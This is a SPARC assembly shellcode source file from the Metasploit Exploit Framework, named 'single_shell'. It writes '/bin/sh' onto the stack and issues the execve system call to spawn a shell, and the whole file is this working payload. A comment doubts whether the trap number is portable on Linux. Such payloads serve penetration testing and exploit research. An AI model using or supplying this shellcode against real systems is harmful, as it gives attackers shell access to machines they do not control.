##
#
#        Name: single_shell
#   Platforms: *BSD, Linux, Solaris
#     Authors: vlad902 <vlad902 [at] gmail.com>
#     Version: $Revision: 1583 $
#     License:
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        Execute /bin/sh. 
#
##

.globl main

main:
	andn	%sp, 7, %sp

	xor	%o3, %o3, %o2
	set	0x2f62696e, %l0
	set	0x2f736800, %l1
	sub	%sp, 0x10, %o0
	sub	%sp, 0x08, %o1
	std	%l0, [ %sp - 0x10 ]  
	st	%o0, [ %sp - 0x08 ]
	st	%g0, [ %sp - 0x04 ]
	mov	0x3b, %g1
	ta	0x08			# How portable is 8 on linux
